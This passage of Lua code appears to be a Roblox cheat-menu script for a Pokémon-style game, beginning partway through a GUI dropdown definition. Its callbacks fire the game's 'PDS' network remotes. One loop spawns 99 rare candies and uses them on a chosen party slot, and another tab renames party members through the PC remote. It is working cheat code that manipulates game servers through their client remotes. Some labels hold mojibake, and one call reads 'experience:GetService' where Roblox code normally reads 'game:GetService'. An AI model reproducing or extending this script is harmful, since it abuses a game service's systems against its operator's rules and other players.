    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon's EV's to max stat",
    Callback = function(v)
    q = 99
        for i = 1, q do
    spawnitem('rarecandy', 1) -- item + quantity
   _p.Network:get("PDS", "useItem", 'rarecandy', v)     
    end
    end,
})
--[[
    PC
]]
local Tab =
    GUI:Tab {
    Name = "PC",
    Icon = "rbxassetid://10441119519"
}
local text
Tab:Textbox {
    Name = "Type Name üÜî",
    Callback = function(str)
        text = str
    end
}

Tab:dropdown({
    Name = "Name Changer üÜî",
    StartingText = "Party Slot",
    Items = {
        {"Slot 1", 1},
        {"Slot 2", 2},
        {"Slot 3", 3},
        {"Slot 4", 4},
        {"Slot 5", 5},
        {"Slot 6", 6}
    },
    Description = "This changes your selected pokemon'(s) name",
    Callback = function(v)
        _p.Network:get("PDS", "openPC")
        _p.Network:get("PDS", "cPC", "nickname", v, text)
    
    end,
})
local ContextActionService = experience:GetService("ContextActionService")

local function handleAction(actionName, inputState, inputObject)
	if inputState == Enum.UserInputState.Begin then
		print(actionName, inputObject)
	end
end

-- Bind action to function
ContextActionService:BindAction("Interact", handleAction, true, Enum.KeyCode.LeftAlt)
